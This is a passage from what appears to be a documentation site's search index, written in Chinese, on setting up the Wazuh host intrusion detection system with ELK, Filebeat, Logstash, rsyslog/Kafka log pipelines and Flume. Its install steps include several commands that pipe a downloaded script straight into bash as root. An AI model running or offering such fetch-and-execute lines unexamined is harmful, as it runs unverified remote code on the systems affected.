elasticsearch-6.3.0.rpm # \u542f\u52a8\u670d\u52a1 systemctl start elasticsearch.service # \u521b\u5efatemplate curl https://raw.githubusercontent.com/wazuh/wazuh/3.3/extensions/elasticsearch/wazuh-elastic6-template-alerts.json | curl -XPUT 'http://localhost:9200/_template/wazuh' -H 'Content-Type: application/json' -d @- \u5b89\u88c5Logstash # \u5b89\u88c5Logstash ln -s /usr/share/jdk1.8.0_171/bin/java /usr/sbin/java rpm -ivh logstash-6.3.0.rpm # Logstash\u914d\u7f6e\u6587\u4ef6 wget https://raw.githubusercontent.com/wazuh/wazuh/3.3/extensions/logstash/01-wazuh-local.conf -O /etc/logstash/conf.d/01-wazuh.conf # \u542f\u52a8\u670d\u52a1 systemctl start logstash.service \u5b89\u88c5Kibana rpm -ivh kibana-6.3.0-x86_64.rpm # \u5b89\u88c5\u63d2\u4ef6 export NODE_OPTIONS= --max-old-space-size=3072 /usr/share/kibana/bin/kibana-plugin install https://packages.wazuh.com/wazuhapp/wazuhapp-3.3.1_6.3.0.zip #\u5378\u8f7d\u63d2\u4ef6 /usr/share/kibana/bin/kibana-plugin remove wazuh \u5907\u6ce8\uff1a\u5b89\u88c5Kibana\u63d2\u4ef6\u4f1a\u62a5\u9519 DeprecationWarning: os.tmpDir() is deprecated. Use os.tmpdir() instead. \u89e3\u51b3\u65b9\u6848\uff1a \u4f7f\u7528nodejs\u7248\u672c10 wget -qO- https://rpm.nodesource.com/setup_10.x | bash - # \u914d\u7f6enodejs\u6e90 wazuh+ELK+Filebeat \u914d\u7f6efilebeat vim /etc/filebeat/filebeat.yml filebeat.yml\u6587\u4ef6\u5185\u5bb9\uff1a filebeat.inputs: - type: log paths: - /var/ossec/logs/alerts/alerts.json document_type: json json.message_key: log json.keys_under_root: true json.overwrite_keys: true output.logstash: hosts: [ localhost:5044 ] \u914d\u7f6elogstash vim /etc/logstash/conf.d/wazuh.conf wazuh.conf\u6587\u4ef6\u5185\u5bb9\uff1a input { beats { port = 5044 codec = json_lines } } filter { if [data][srcip] { mutate { add_field = [ @src_ip , %{[data][srcip]} ] } } if [data][aws][sourceIPAddress] { mutate { add_field = [ @src_ip , %{[data][aws][sourceIPAddress]} ] } } } filter { geoip { source = @src_ip target = GeoLocation fields = [ city_name , country_name , region_name , location ] } date { match = [ timestamp , ISO8601 ] target = @timestamp } mutate { remove_field = [ timestamp , beat , input_type , tags , count , @version , log , offset , type , @src_ip , host ] } } output { elasticsearch { hosts = [ localhost:9200 ] index = wazuh-alerts-3.x-%{+YYYY.MM.dd} document_type = wazuh } } wazuh\u5ba2\u6237\u7aef\u81ea\u52a8\u5316\u90e8\u7f72 \u5bf9\u4e8e\u4e92\u8054\u7f51\u516c\u53f8\u6765\u8bf4\uff0c\u4f01\u4e1a\u670d\u52a1\u5668\u5f88\u591a\u65f6\u5019\u53d8\u5316\u5f88\u9891\u7e41\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u505a\u5230\u81ea\u52a8\u5316\u6765\u90e8\u7f72agent\uff0c\u540c\u6837\u5728\u670d\u52a1\u5668\u91cf\u7ea7\u5f88\u5927\u7684\u65f6\u5019\u6211\u4eec\u4e5f\u9700\u8981\u4e00\u952e\u90e8\u7f72\u3002 \u5bf9\u4e8eagent\u6bd4\u8f83\u91cd\u8981\u7684\u5c31\u662f\u670d\u52a1\u7aef\u5148\u751f\u6210\u5bc6\u94a5\uff0c\u7136\u540e\u5ba2\u6237\u7aef\u83b7\u53d6\u5bc6\u94a5\u5bfc\u5165\u6587\u4ef6\u4e2d\u3002 \u53c2\u8003\u5730\u5740 \u4ee3\u7801\u5b9e\u73b0 \u4ee3\u7801\u5730\u5740 \u5927\u5bb6\u53ef\u4ee5\u6839\u636e\u9700\u6c42\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u4fee\u6539\u5b8c\u6210\u4ee5\u540e\u5c31\u53ef\u4ee5\u4e0e\u8fd0\u7ef4\u534f\u8c03\u5728\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u65f6\u5019\u52a0\u5165\u5ba2\u6237\u7aef\u81ea\u52a8\u90e8\u7f72\u7684\u4ee3\u7801\u3002","title":"wazuh \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#wazuh","text":"\u5b98\u7f51\u5730\u5740 \u5b98\u65b9\u6587\u6863","title":"wazuh \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#_1","text":"","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#wazuh-server","text":"rpm -ivh wazuh-manager-3.3.1-1.x86_64.rpm # \u542f\u52a8\u670d\u52a1 systemctl start wazuh-manager.service systemctl status wazuh-manager.service","title":"wazuh server\u5b89\u88c5"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#wazuh-api","text":"\u5b89\u88c5nodejs wget -qO- https://rpm.nodesource.com/setup_8.x | bash - # \u8fd9\u91cc\u7684\u7248\u672c\u4f1a\u5bfc\u81f4\u540e\u9762\u7684\u62a5\u9519 yum install nodejs.x86_64 \u5b89\u88c5python2\uff08Centos7\u9ed8\u8ba4python2\uff09 \u5b89\u88c5wazuh api rpm -ivh wazuh-api-3.3.1-1.x86_64.rpm systemctl start wazuh-api.service systemctl status wazuh-api.service","title":"wazuh api\u5b89\u88c5"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#wazuh-client","text":"rpm -ivh wazuh-agent-3.3.1-1.x86_64.rpm # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /var/ossec/etc/ossec.conf # \u5bfc\u5165\u5bc6\u94a5 /var/ossec/bin/manage_agents # \u542f\u52a8\u670d\u52a1 /var/ossec/bin/ossec-control start","title":"wazuh client\u5b89\u88c5"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#elk","text":"\u5b89\u88c5ElasticSearch # \u5b89\u88c5java yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u5b89\u88c5es rpm -ivh elasticsearch-6.3.0.rpm # \u542f\u52a8\u670d\u52a1 systemctl start elasticsearch.service # \u521b\u5efatemplate curl https://raw.githubusercontent.com/wazuh/wazuh/3.3/extensions/elasticsearch/wazuh-elastic6-template-alerts.json | curl -XPUT 'http://localhost:9200/_template/wazuh' -H 'Content-Type: application/json' -d @- \u5b89\u88c5Logstash # \u5b89\u88c5Logstash ln -s /usr/share/jdk1.8.0_171/bin/java /usr/sbin/java rpm -ivh logstash-6.3.0.rpm # Logstash\u914d\u7f6e\u6587\u4ef6 wget https://raw.githubusercontent.com/wazuh/wazuh/3.3/extensions/logstash/01-wazuh-local.conf -O /etc/logstash/conf.d/01-wazuh.conf # \u542f\u52a8\u670d\u52a1 systemctl start logstash.service \u5b89\u88c5Kibana rpm -ivh kibana-6.3.0-x86_64.rpm # \u5b89\u88c5\u63d2\u4ef6 export NODE_OPTIONS= --max-old-space-size=3072 /usr/share/kibana/bin/kibana-plugin install https://packages.wazuh.com/wazuhapp/wazuhapp-3.3.1_6.3.0.zip #\u5378\u8f7d\u63d2\u4ef6 /usr/share/kibana/bin/kibana-plugin remove wazuh \u5907\u6ce8\uff1a\u5b89\u88c5Kibana\u63d2\u4ef6\u4f1a\u62a5\u9519 DeprecationWarning: os.tmpDir() is deprecated. Use os.tmpdir() instead. \u89e3\u51b3\u65b9\u6848\uff1a \u4f7f\u7528nodejs\u7248\u672c10 wget -qO- https://rpm.nodesource.com/setup_10.x | bash - # \u914d\u7f6enodejs\u6e90","title":"ELK\u5b89\u88c5"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#wazuhelkfilebeat","text":"","title":"wazuh+ELK+Filebeat"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#filebeat","text":"vim /etc/filebeat/filebeat.yml filebeat.yml\u6587\u4ef6\u5185\u5bb9\uff1a filebeat.inputs: - type: log paths: - /var/ossec/logs/alerts/alerts.json document_type: json json.message_key: log json.keys_under_root: true json.overwrite_keys: true output.logstash: hosts: [ localhost:5044 ]","title":"\u914d\u7f6efilebeat"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#logstash","text":"vim /etc/logstash/conf.d/wazuh.conf wazuh.conf\u6587\u4ef6\u5185\u5bb9\uff1a input { beats { port = 5044 codec = json_lines } } filter { if [data][srcip] { mutate { add_field = [ @src_ip , %{[data][srcip]} ] } } if [data][aws][sourceIPAddress] { mutate { add_field = [ @src_ip , %{[data][aws][sourceIPAddress]} ] } } } filter { geoip { source = @src_ip target = GeoLocation fields = [ city_name , country_name , region_name , location ] } date { match = [ timestamp , ISO8601 ] target = @timestamp } mutate { remove_field = [ timestamp , beat , input_type , tags , count , @version , log , offset , type , @src_ip , host ] } } output { elasticsearch { hosts = [ localhost:9200 ] index = wazuh-alerts-3.x-%{+YYYY.MM.dd} document_type = wazuh } }","title":"\u914d\u7f6elogstash"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#wazuh_1","text":"\u5bf9\u4e8e\u4e92\u8054\u7f51\u516c\u53f8\u6765\u8bf4\uff0c\u4f01\u4e1a\u670d\u52a1\u5668\u5f88\u591a\u65f6\u5019\u53d8\u5316\u5f88\u9891\u7e41\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u505a\u5230\u81ea\u52a8\u5316\u6765\u90e8\u7f72agent\uff0c\u540c\u6837\u5728\u670d\u52a1\u5668\u91cf\u7ea7\u5f88\u5927\u7684\u65f6\u5019\u6211\u4eec\u4e5f\u9700\u8981\u4e00\u952e\u90e8\u7f72\u3002 \u5bf9\u4e8eagent\u6bd4\u8f83\u91cd\u8981\u7684\u5c31\u662f\u670d\u52a1\u7aef\u5148\u751f\u6210\u5bc6\u94a5\uff0c\u7136\u540e\u5ba2\u6237\u7aef\u83b7\u53d6\u5bc6\u94a5\u5bfc\u5165\u6587\u4ef6\u4e2d\u3002 \u53c2\u8003\u5730\u5740","title":"wazuh\u5ba2\u6237\u7aef\u81ea\u52a8\u5316\u90e8\u7f72"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/#_2","text":"\u4ee3\u7801\u5730\u5740 \u5927\u5bb6\u53ef\u4ee5\u6839\u636e\u9700\u6c42\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u4fee\u6539\u5b8c\u6210\u4ee5\u540e\u5c31\u53ef\u4ee5\u4e0e\u8fd0\u7ef4\u534f\u8c03\u5728\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u65f6\u5019\u52a0\u5165\u5ba2\u6237\u7aef\u81ea\u52a8\u90e8\u7f72\u7684\u4ee3\u7801\u3002","title":"\u4ee3\u7801\u5b9e\u73b0"},{"location":"infrastructure-security/host-security/log-analysis/","text":"\u65e5\u5fd7\u5206\u6790 Web\u65e5\u5fd7\u5206\u6790\u76ee\u6807 \u8fd4\u56de\u72b6\u6001\u7801\u5206\u5e03\u56fe\uff1a\u9488\u5bf9Java\u51fa\u73b0\u5927\u91cf500\u7684\u60c5\u51b5\u9700\u8981\u6ce8\u610f\uff1b PV\u8d8b\u52bf\u56fe\uff1a \u6e90IP\u5206\u5e03\u56fe\uff1a \u6765\u6e90\u56fd\u5bb6\u6392\u884c\uff1a \u6765\u6e90\u57ce\u5e02\u6392\u884c\uff1a \u72ec\u7acbIP\u8bbf\u95ee\u8d8b\u52bf\u56fe\uff1a \u8bbf\u95ee\u8def\u5f84\u6392\u884c\uff1a \u8bbf\u95ee\u6765\u6e90\u6392\u884c\uff1a \u6d4f\u89c8\u5668\u5206\u5e03\u56fe\uff1a \u7279\u5b9a\u63a5\u53e3\u8bbf\u95ee\u56fe\uff1a \u65e5\u5fd7\u5206\u6790\u67b6\u6784 \u6211\u4eec\u4f01\u4e1a\u5185\u90e8\u4f7f\u7528\u7684\u67b6\u6784\uff1a \u65e5\u5fd7\u6e90-- rsyslog client-- rsyslog server-- kafka cluster-- ELK cluster rsyslog client # \u5bfc\u5165\u6a21\u5757 module(load= imfile mode= inotify ) # \u8bbe\u7f6e\u5de5\u4f5c\u76ee\u5f55 $WorkDirectory /var/lib/rsyslog $ActionQueueWorkerThreads 1 $ActionQueueDequeueBatchSize 30 $ActionQueueDequeueSlowdown 300 $ActionQueueDiscardSeverity 8 $ActionQueueFileName action_queue_buffer_bitun_nginx_access $ActionQueueMaxDiskSpace 10m $ActionQueueSaveOnShutdown on $MaxMessageSize 64k input(type= imfile File= log-path Tag= tag_name Severity= info PersistStateInterval= 20000 reopenOnTruncate= on ) if $programname == 'tag_name' then @@Rsyslog Server IP:Port if $programname == 'tag_name' then stop rsyslog server module(load= omkafka ) $SystemLogSocketFlowControl on #\u5982\u679c\u961f\u5217\u6ee1\u4e86\uff0c\u4f1a\u6682\u505c\u4e00\u4f1a\u7b49\u5f85\u961f\u5217\u6d88\u8017 $SystemLogRateLimitInterval 0 #default 0 \u901f\u7387\u9650\u5236\uff0c\u6539\u4e3a0\u4e0d\u9650\u5236 $ActionQueueType LinkedList # use asynchronous processing $ActionQueueFileName backup_local # set file name, also enables disk mode $ActionResumeRetryCount -1 # infinite retries on insert failure $ActionQueueSaveOnShutdown on $ActionQueueMaxFileSize 500m $ActionQueueMaxDiskSpace 10g $template l7_msg, %msg:1:$% :rawmsg, contains, tag_name action( type= omkafka broker= Kafka Server IP:Port(\u9ed8\u8ba49092) topic= topic_name partitions.number= 10 confParam=[ socket.keepalive.enable=true ] template= l7_msg action.resumeretrycount= 1 ) kafka cluster # \u521b\u5efa\u597dtopic Logstash input { kafka { bootstrap_servers = [ Kakfa Server IP:Port(\u9ed8\u8ba49092) ] topics = [ topic_name ] type = httpd } } output { elasticsearch { hosts = [ ElasticSearch Server IP:Port(\u9ed8\u8ba49200) ] index = httpd-%{+YYYY.MM} } } \u65e5\u5fd7\u6e90 \u65e5\u5fd7\u91c7\u96c6 rsyslog \u53c2\u8003\uff1a\u65e5\u5fd7\u5206\u6790\u67b6\u6784\u4e00\u8282 \u5b98\u65b9\u6587\u6863 Beats Filebeat\uff1a Packetbeat\uff1a Metricbeat\uff1a Winlogbeat\uff1a Beats\u5b89\u88c5 \u5b89\u88c5\u6587\u6863 Beats\u914d\u7f6e Input \u914d\u7f6e Output \u914d\u7f6e Beats\u6848\u4f8b Flume source\uff1a channel\uff1a sink\uff1a Flume\u5b89\u88c5 # \u89e3\u51b3\u4f9d\u8d56 tar -xf jdk-8u191-linux-x64.tar.gz -C /app/ vim /etc/profile export JAVA_HOME=/app/jdk1.8.0_191 export PATH=$JAVA_HOME/bin:$PATH source /etc/profile # \u9a8c\u8bc1java\u662f\u5426\u5b89\u88c5\u6210\u529f java -version # \u4e0b\u8f7dflume\uff0c\u89e3\u538b\u5230\u6307\u5b9a\u76ee\u5f55 tar -xf apache-flume-1.8.0-bin.tar.gz -C /app/ # \u914d\u7f6e\u73af\u5883\u53d8\u91cf vim /etc/profile /etc/profile\u6587\u4ef6\u5185\u5bb9\uff1a export FLUME_HOME=/app/apache-flume-1.8.0-bin export PATH=$FLUME_HOME/bin:$PATH source /etc/profile # \u914d\u7f6eflume\u8fd0\u884c\u73af\u5883\u6587\u4ef6 cp /app/apache-flume-1.8.0-bin/conf/flume-env.sh.template /app/apache-flume-1.8.0-bin/conf/flume-env.sh vim /app/apache-flume-1.8.0-bin/conf/flume-env.sh flume-env.sh\u6587\u4ef6\u5185\u5bb9\uff1a export JAVA_HOME=JAVA_PATH # \u67e5\u770b\u662f\u5426\u5b89\u88c5\u5b8c\u6210 flume-ng version Flume\u6848\u4f8b\uff1a\u4ece\u6307\u5b9a\u7f51\u7edc\u7aef\u53e3\u91c7\u96c6\u6570\u636e\u8f93\u51fa\u5230\u63a7\u5236\u53f0 \u5b98\u65b9\u6587\u6863 \u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/example-1.conf example-1.conf\u6587\u4ef6\u5185\u5bb9\uff1a # a1:agent\u540d\u79f0 # r1:source\u540d\u79f0 # c1:channel\u540d\u79f0 # k1:sink\u540d\u79f0 # Name the components on this agent a1.sources = r1 a1.channels = c1 a1.sinks = k1 # Describe/configure the source a1.sources.r1.type = netcat a1.sources.r1.bind = localhost a1.sources.r1.port = 44444 # Describe the sink a1.sinks.k1.type = logger # Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100 # Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1 \u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name a1 --conf /app/apache-flume-1.8.0-bin/conf \\ --conf-file /app/apache-flume-1.8.0-bin/conf/example-1.conf \\ -Dflume.root.logger=INFO,console # \u5907\u6ce8\uff1a-Dflume.root.logger=INFO,console\uff08java\u53c2\u6570\uff0cINFO\u8f93\u51fa\u5230\u63a7\u5236\u53f0\uff09 \u5bf9\u8f93\u51fa\u7ed3\u679c\u7684\u8bf4\u660e\uff1a Event\u662fFlume\u6570\u636e\u4f20\u8f93\u7684\u57fa\u672c\u5355\u5143\uff0cEvent=[header(\u53ef\u9009)] + body(\u5fc5\u9009) Flume\u6848\u4f8b\uff1a\u5b9e\u65f6\u76d1\u63a7\u6587\u4ef6\u65b0\u589e\u6570\u636e\u8f93\u51fa\u5230\u63a7\u5236\u53f0 \u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/example-2.conf example-2.conf\u6587\u4ef6\u5185\u5bb9\uff1a # Name the components on this agent a1.sources = r1 a1.sinks = k1 a1.channels = c1 # Describe/configure the source a1.sources.r1.type = exec a1.sources.r1.command = tail -F /var/log/messages a1.sources.r1.shell = /bin/sh -c # Describe the sink a1.sinks.k1.type = logger # Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100 # Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1 \u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name a1 --conf /app/apache-flume-1.8.0-bin/conf \\ --conf-file /app/apache-flume-1.8.0-bin/conf/example-2.conf \\ -Dflume.root.logger=INFO,console Flume\u6848\u4f8b\uff1a\u5c06Server1\u7684\u65e5\u5fd7\u4f20\u8f93\u5230Server2\u7684\u63a7\u5236\u53f0 \u5728sever1\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/exec-memory-avro.conf exec-memory-avro.conf\u6587\u4ef6\u5185\u5bb9\uff1a exec-memory-avro.sources = exec-source exec-memory-avro.sinks = avro-sink exec-memory-avro.channels = memory-channel exec-memory-avro.sources.exec-source.type = exec exec-memory-avro.sources.exec-source.command = tail -F /var/log/messages exec-memory-avro.sources.exec-source.shell = /bin/sh -c exec-memory-avro.sinks.avro-sink.type = avro exec-memory-avro.sinks.avro-sink.hostname = localhost exec-memory-avro.sinks.avro-sink.port = 44444 exec-memory-avro.channels.memory-channel.type = memory exec-memory-avro.channels.memory-channel.capacity = 1000 exec-memory-avro.channels.memory-channel.transactionCapacity = 100 exec-memory-avro.sources.exec-source.channels = memory-channel exec-memory-avro.sinks.avro-sink.channel = memory-channel \u5728server2\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/avro-memory-logger.conf avro-memory-logger.conf\u6587\u4ef6\u5185\u5bb9\uff1a avro-memory-logger.sources = avro-source avro-memory-logger.sinks = logger-sink avro-memory-logger.channels = memory-channel avro-memory-logger.sources.avro-source.type = avro avro-memory-logger.sources.avro-source.bind = localhost avro-memory-logger.sources.avro-source.port = 44444 avro-memory-logger.sinks.logger-sink.type = logger avro-memory-logger.channels.memory-channel.type = memory avro-memory-logger.channels.memory-channel.capacity = 1000 avro-memory-logger.channels.memory-channel.transactionCapacity = 100 avro-memory-logger.sources.avro-source.channels = memory-channel avro-memory-logger.sinks.logger-sink.channel = memory-channel \u6267\u884c\u547d\u4ee4\uff1a \u5148\u5728server2\u6267\u884c\uff0c\u518d\u6267\u884cserver1 flume-ng agent --name avro-memory-logger --conf /app/apache-flume-1.8.0-bin/conf \\ --conf-file /app/apache-flume-1.8.0-bin/conf/avro-memory-logger.conf \\ -Dflume.root.logger=INFO,console flume-ng agent --name exec-memory-avro --conf /app/apache-flume-1.8.0-bin/conf \\ --conf-file /app/apache-flume-1.8.0-bin/conf/exec-memory-avro.conf \\ -Dflume.root.logger=INFO,console Logstash \u5b98\u65b9\u6587\u6863 \u65e5\u5fd7\u5904\u7406 Logstash filter Spark or Storm \u65e5\u5fd7\u5b58\u50a8 Database ElasticSearch Hive HBase \u53ef\u89c6\u5316\u5c55\u793a(\u65e5\u5fd7\u4ef7\u503c) Kibana Graylog \u65e5\u5fd7\u5206\u6790\u5e73\u53f0\u5bf9\u6bd4 \u53c2\u8003\u8d44\u6599 \u51e0\u5341\u6761\u4e1a\u52a1\u7ebf\u65e5\u5fd7\u7cfb\u7edf\u5982\u4f55\u6536\u96c6\u5904\u7406\uff1f Splunk vs ELK","title":"\u65e5\u5fd7\u5206\u6790"},{"location":"infrastructure-security/host-security/log-analysis/#_1","text":"","title":"\u65e5\u5fd7\u5206\u6790"},{"location":"infrastructure-security/host-security/log-analysis/#web","text":"\u8fd4\u56de\u72b6\u6001\u7801\u5206\u5e03\u56fe\uff1a\u9488\u5bf9Java\u51fa\u73b0\u5927\u91cf500\u7684\u60c5\u51b5\u9700\u8981\u6ce8\u610f\uff1b PV\u8d8b\u52bf\u56fe\uff1a \u6e90IP\u5206\u5e03\u56fe\uff1a \u6765\u6e90\u56fd\u5bb6\u6392\u884c\uff1a \u6765\u6e90\u57ce\u5e02\u6392\u884c\uff1a \u72ec\u7acbIP\u8bbf\u95ee\u8d8b\u52bf\u56fe\uff1a \u8bbf\u95ee\u8def\u5f84\u6392\u884c\uff1a \u8bbf\u95ee\u6765\u6e90\u6392\u884c\uff1a \u6d4f\u89c8\u5668\u5206\u5e03\u56fe\uff1a \u7279\u5b9a\u63a5\u53e3\u8bbf\u95ee\u56fe\uff1a","title":"Web\u65e5\u5fd7\u5206\u6790\u76ee\u6807"},{"location":"infrastructure-security/host-security/log-analysis/#_2","text":"\u6211\u4eec\u4f01\u4e1a\u5185\u90e8\u4f7f\u7528\u7684\u67b6\u6784\uff1a \u65e5\u5fd7\u6e90-- rsyslog client-- rsyslog server-- kafka cluster-- ELK cluster rsyslog client # \u5bfc\u5165\u6a21\u5757 module(load= imfile mode= inotify ) # \u8bbe\u7f6e\u5de5\u4f5c\u76ee\u5f55 $WorkDirectory /var/lib/rsyslog $ActionQueueWorkerThreads 1 $ActionQueueDequeueBatchSize 30 $ActionQueueDequeueSlowdown 300 $ActionQueueDiscardSeverity 8 $ActionQueueFileName action_queue_buffer_bitun_nginx_access $ActionQueueMaxDiskSpace 10m $ActionQueueSaveOnShutdown on $MaxMessageSize 64k input(type= imfile File= log-path Tag= tag_name Severity= info PersistStateInterval= 20000 reopenOnTruncate= on ) if $programname == 'tag_name' then @@Rsyslog Server IP:Port if $programname == 'tag_name' then stop rsyslog server module(load= omkafka ) $SystemLogSocketFlowControl on #\u5982\u679c\u961f\u5217\u6ee1\u4e86\uff0c\u4f1a\u6682\u505c\u4e00\u4f1a\u7b49\u5f85\u961f\u5217\u6d88\u8017 $SystemLogRateLimitInterval 0 #default 0 \u901f\u7387\u9650\u5236\uff0c\u6539\u4e3a0\u4e0d\u9650\u5236 $ActionQueueType LinkedList # use asynchronous processing $ActionQueueFileName backup_local # set file name, also enables disk mode $ActionResumeRetryCount -1 # infinite retries on insert failure $ActionQueueSaveOnShutdown on $ActionQueueMaxFileSize 500m $ActionQueueMaxDiskSpace 10g $template l7_msg, %msg:1:$% :rawmsg, contains, tag_name action( type= omkafka broker= Kafka Server IP:Port(\u9ed8\u8ba49092) topic= topic_name partitions.number= 10 confParam=[ socket.keepalive.enable=true ] template= l7_msg action.resumeretrycount= 1 ) kafka cluster # \u521b\u5efa\u597dtopic Logstash input { kafka { bootstrap_servers = [ Kakfa Server IP:Port(\u9ed8\u8ba49092) ] topics = [ topic_name ] type = httpd } } output { elasticsearch { hosts = [ ElasticSearch Server IP:Port(\u9ed8\u8ba49200) ] index = httpd-%{+YYYY.MM} } }","title":"\u65e5\u5fd7\u5206\u6790\u67b6\u6784"},{"location":"infrastructure-security/host-security/log-analysis/#_3","text":"","title":"\u65e5\u5fd7\u6e90"},{"location":"infrastructure-security/host-security/log-analysis/#_4","text":"","title":"\u65e5\u5fd7\u91c7\u96c6"},{"location":"infrastructure-security/host-security/log-analysis/#rsyslog","text":"\u53c2\u8003\uff1a\u65e5\u5fd7\u5206\u6790\u67b6\u6784\u4e00\u8282 \u5b98\u65b9\u6587\u6863","title":"rsyslog"},{"location":"infrastructure-security/host-security/log-analysis/#beats","text":"Filebeat\uff1a Packetbeat\uff1a Metricbeat\uff1a Winlogbeat\uff1a Beats\u5b89\u88c5 \u5b89\u88c5\u6587\u6863 Beats\u914d\u7f6e Input \u914d\u7f6e Output \u914d\u7f6e Beats\u6848\u4f8b","title":"Beats"},{"location":"infrastructure-security/host-security/log-analysis/#flume","text":"source\uff1a channel\uff1a sink\uff1a Flume\u5b89\u88c5 # \u89e3\u51b3\u4f9d\u8d56 tar -xf jdk-8u191-linux-x64.tar.gz -C /app/ vim /etc/profile export JAVA_HOME=/app/jdk1.8.0_191 export PATH=$JAVA_HOME/bin:$PATH source /etc/profile # \u9a8c\u8bc1java\u662f\u5426\u5b89\u88c5\u6210\u529f java -version # \u4e0b\u8f7dflume\uff0c\u89e3\u538b\u5230\u6307\u5b9a\u76ee\u5f55 tar -xf apache-flume-1.8.0-bin.tar.gz -C /app/ # \u914d\u7f6e\u73af\u5883\u53d8\u91cf vim /etc/profile /etc/profile\u6587\u4ef6\u5185\u5bb9\uff1a export FLUME_HOME=/app/apache-flume-1.8.0-bin export PATH=$FLUME_HOME/bin:$PATH source /etc/profile # \u914d\u7f6eflume\u8fd0\u884c\u73af\u5883\u6587\u4ef6 cp /app/apache-flume-1.8.0-bin/conf/flume-env.sh.template /app/apache-flume-1.8.0-bin/conf/flume-env.sh vim /app/apache-flume-1.8.0-bin/conf/flume-env.sh flume-env.sh\u6587\u4ef6\u5185\u5bb9\uff1a export JAVA_HOME=JAVA_PATH # \u67e5\u770b\u662f\u5426\u5b89\u88c5\u5b8c\u6210 flume-ng version Flume\u6848\u4f8b\uff1a\u4ece\u6307\u5b9a\u7f51\u7edc\u7aef\u53e3\u91c7\u96c6\u6570\u636e\u8f93\u51fa\u5230\u63a7\u5236\u53f0 \u5b98\u65b9\u6587\u6863 \u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/example-1.conf example-1.conf\u6587\u4ef6\u5185\u5bb9\uff1a # a1:agent\u540d\u79f0 # r1:source\u540d\u79f0 # c1:channel\u540d\u79f0 # k1:sink\u540d\u79f0 # Name the components on this agent a1.sources = r1 a1.channels = c1 a1.sinks = k1 # Describe/configure the source a1.sources.r1.type = netcat a1.sources.r1.bind = localhost a1.sources.r1.port = 44444 # Describe the sink a1.sinks.k1.type = logger # Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100 # Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1 \u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name a1 --conf /app/apache-flume-1.8.0-bin/conf \\ --conf-file /app/apache-flume-1.8.0-bin/conf/example-1.conf \\ -Dflume.root.logger=INFO,console # \u5907\u6ce8\uff1a-Dflume.root.logger=INFO,console\uff08java\u53c2\u6570\uff0cINFO\u8f93\u51fa\u5230\u63a7\u5236\u53f0\uff09 \u5bf9\u8f93\u51fa\u7ed3\u679c\u7684\u8bf4\u660e\uff1a Event\u662fFlume\u6570\u636e\u4f20\u8f93\u7684\u57fa\u672c\u5355\u5143\uff0cEvent=[header(\u53ef\u9009)] + body(\u5fc5\u9009) Flume\u6848\u4f8b\uff1a\u5b9e\u65f6\u76d1\u63a7\u6587\u4ef6\u65b0\u589e\u6570\u636e\u8f93\u51fa\u5230\u63a7\u5236\u53f0 \u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/example-2.conf example-2.conf\u6587\u4ef6\u5185\u5bb9\uff1a # Name the components on this agent a1.sources = r1 a1.sinks = k1 a1.channels = c1 # Describe/configure the source a1.sources.r1.type = exec a1.sources.r1.command = tail -F /var/log/messages a1.sources.r1.shell = /bin/sh -c # Describe the sink a1.sinks.k1.type = logger # Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100 # Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1 \u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name a1 --conf /app/apache-flume-1.8.0-bin/conf \\ --conf-file /app/apache-flume-1.8.0-bin/conf/example-2.conf \\ -Dflume.root.logger=INFO,console Flume\u6848\u4f8b\uff1a\u5c06Server1\u7684\u65e5\u5fd7\u4f20\u8f93\u5230Server2\u7684\u63a7\u5236\u53f0 \u5728sever1\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/exec-memory-avro.conf exec-memory-avro.conf\u6587\u4ef6\u5185\u5bb9\uff1a exec-memory-avro.sources = exec-source exec-memory-avro.sinks = avro-sink exec-memory-avro.channels = memory-channel 